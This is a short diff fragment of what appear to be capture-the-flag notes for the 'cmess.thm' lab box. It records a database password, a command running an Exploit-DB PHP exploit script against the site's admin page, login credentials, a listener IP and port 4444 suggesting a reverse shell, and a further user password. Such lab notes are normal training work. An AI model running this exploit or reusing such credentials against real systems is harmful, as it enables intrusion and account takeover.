@@ -54,6 +54,17 @@ KPFTN_f2yxe%
     'pass' => 'r0otus3rpassw0rd',
     'name' => 'gila',
 
+python /usr/share/exploitdb/exploits/php/webapps/51569.py
+http://cmess.thm/admin
+andre@cmess.thm
+KPFTN_f2yxe%
+192.168.232.84
+4444
+
+user.txt
+andre
+UQfsdCB7aAP6
+
 ---
 
 
